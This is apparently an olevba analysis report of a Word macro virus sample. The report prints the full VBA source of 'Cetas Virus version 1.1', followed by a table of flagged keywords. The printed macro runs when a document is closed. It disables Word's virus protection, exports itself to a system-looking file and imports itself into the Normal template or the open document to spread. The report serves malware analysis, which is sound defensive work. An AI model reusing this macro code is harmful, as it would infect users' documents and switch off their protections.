olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Opey.u
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Opey.u - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xHeCs11.bas 
in file: ./Virus.MSWord.Opey.u - OLE stream: 'Macros/VBA/xHeCs11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro created 09-15-99 by xHeCs\r\n\r\n"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.xHeCs1.AutoClose"
'
' Cetas Virus version 1.1 by xHeCs
' ATTENTION LAMERS that's you !!!.
'     You can learn a lot from this virus, But Please respect
' What is not yours.
'
SaveVPSet = Application.Options.VirusProtection
Application.Options.VirusProtection = False
On Error Resume Next
If Activation = 12 Or Activation = 23 Or Activation = 4 Then Copyright
Application.VBE.ActiveVBProject.VBComponents("xHeCs11").Export "c:\MsWin.sys"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "xHeCs11" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "xHeCs11" Then ActivInstall = True
Next I
If ActivInstall = True And NormInstall = False Then Set Target = NormalTemplate.VBProject _
Else: If ActivInstall = False And NormInstall = True Then Set Target = ActiveDocument.VBProject
Target.VBComponents.Import ("c:\MsWin.sys")
If Year(Now()) = 2000 Then Copyright
Application.Options.VirusProtection = SaveVPSet
End Sub
Function Activation()
   Activation = Day(Now())
End Function
Function Copyright()
   If Minute(Now()) = 23 Then
      MsgBox " Cetas Virus version 1.1 by xHeCs ", vbCritical
      Selection.TypeParagraph
      Selection.TypeParagraph
      Selection.TypeText Text:="Cetas Virus version 1.1"
      Selection.TypeParagraph
      Selection.TypeText Text:="    (C) Copyright xHeCS 1999-2000"
      Selection.TypeParagraph
      Selection.TypeParagraph
      Selection.TypeText Text:="      Life is like a box of chocolate"
      Selection.TypeParagraph
      Selection.TypeText Text:="You'll never know what your gonna get"
      Selection.TypeParagraph
      Selection.TypeParagraph
   End If
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

